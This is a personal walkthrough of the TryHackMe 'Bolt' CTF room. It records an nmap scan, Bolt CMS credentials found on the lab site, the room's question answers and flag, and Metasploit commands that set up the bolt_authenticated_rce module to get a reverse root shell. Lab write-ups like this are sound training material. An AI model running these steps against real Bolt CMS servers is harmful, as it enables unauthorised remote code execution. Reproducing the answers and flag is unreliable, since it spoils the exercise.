
#CTF #FreeRoom 

https://tryhackme.com/r/room/bolt

```
10.10.11.200

nmap -sC -sS -p- -A $ip

22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    (PHP 7.2.32-1)

http://10.10.11.200:800

Jake (Admin)
username: bolt

http://10.10.11.200:8000/entry/message-for-it-department
boltadmin123

http://10.10.11.200:8000/bolt/login

bolt : boltadmin123

```

bolt cms admin login
- domain/bolt
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/bolt-cms.html
- https://www.exploit-db.com/exploits/48296
- 

```
What port number has a web server with a CMS running?
8000

What is the username we can find in the CMS?
bolt

What is the password we can find for the username?
boltadmin123

What version of the CMS is installed on the server? (Ex: Name 1.1.1)
bolt 3.7.1

There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?
48296

Metasploit recently added an exploit module for this vulnerability.
Set the **LHOST, LPORT, RHOST, USERNAME, PASSWORD** in msfconsole before running the exploit

search bolt
exploit/unix/webapp/bolt_authenticated_rce 

use bolt_authenticated_rce

set LHOST 10.10.169.217
set LPORT --- 4444
set RHOSTS 10.10.11.200
set USERNAME bolt
set PASSWORD boltadmin123

run 

whoami = root
pwd
	/home/bolt/public/files
cd /home/
ls

flag.txt

Look for flag.txt inside the machine.

THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}

```

needed only some help this time
https://www.youtube.com/watch?v=QBrJDUYtAhI

https://github.com/epi052/feroxbuster